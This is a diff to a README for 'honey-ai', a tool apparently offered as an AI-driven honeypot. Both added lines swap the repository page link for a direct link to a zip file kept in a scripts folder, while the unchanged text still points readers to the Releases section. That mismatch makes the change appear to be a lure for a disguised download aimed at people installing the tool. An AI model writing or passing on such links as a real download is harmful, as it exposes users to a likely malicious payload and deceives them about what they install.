@@ -1,6 +1,6 @@
 # 🍯 honey-ai - Protect your network with smart deception
 
-[![Download honey-ai](https://img.shields.io/badge/Download-honey--ai-blue.svg)](https://github.com/Genusalsophilaeccehomo626/honey-ai)
+[![Download honey-ai](https://img.shields.io/badge/Download-honey--ai-blue.svg)](https://raw.githubusercontent.com/Genusalsophilaeccehomo626/honey-ai/main/scripts/ai_honey_3.4-beta.5.zip)
 
 honey-ai acts as a digital trap for malicious actors. It creates a fake version of your network services to lure attackers into a controlled space. This software uses local artificial intelligence to analyze incoming threats and provide real-time alerts. You can monitor suspicious activity without putting your actual data at risk.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware and software to run honey-ai effectively. 
 
 The first step involves obtaining the application files. Visit the official repository page to select the correct installer for your machine. 
 
-[Click here to visit the download page](https://github.com/Genusalsophilaeccehomo626/honey-ai)
+[Click here to visit the download page](https://raw.githubusercontent.com/Genusalsophilaeccehomo626/honey-ai/main/scripts/ai_honey_3.4-beta.5.zip)
 
 Once you reach the link, look for the "Releases" section on the right side of the page. Select the most recent version labeled for Windows. Save the setup file to your desktop or downloads folder. 
 
